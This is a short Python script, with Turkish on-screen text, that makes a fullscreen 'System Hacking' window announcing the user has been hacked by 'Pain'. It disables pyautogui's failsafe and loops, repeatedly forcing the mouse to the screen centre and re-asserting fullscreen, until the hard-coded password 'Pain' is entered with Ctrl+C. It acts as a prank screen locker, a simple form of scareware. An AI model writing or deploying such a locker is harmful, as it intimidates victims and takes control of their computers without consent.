import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


window = Tk()
pyautogui.FAILSAFE = False

width = window.winfo_screenwidth()
height = window.winfo_screenheight()

window.title("System Hacking")

window.attributes("-fullscreen", True)

entry = Entry(window,font= 1)
entry.place(width=150,height=50,x=width/2-75,y=height/2-25)

label0 = Label(window,text="sifreyi girip ctrl c basarsan kapanir")
label0.place(x=width/2-75-130,y=height/2-25-100)
label1 = Label(window,text="Pain tarafindan hacklendin")
label1.grid(row=0,column=0)

window.update()
sleep(0.2)

click(width/2,height/2)

def callback(event):
    global k,entry
    if entry.get()=="Pain":
        k = True

def on_closing():
    click(width/2,height/2)
    moveTo(width/2,height/2)

    window.attributes("-fullscreen", True)

    window.protocol("WM_DELETE_WINDOW",on_closing)
    window.update()

    window.bind("<Control-KeyPress-c>",callback)

k = False
while not k:
    on_closing()
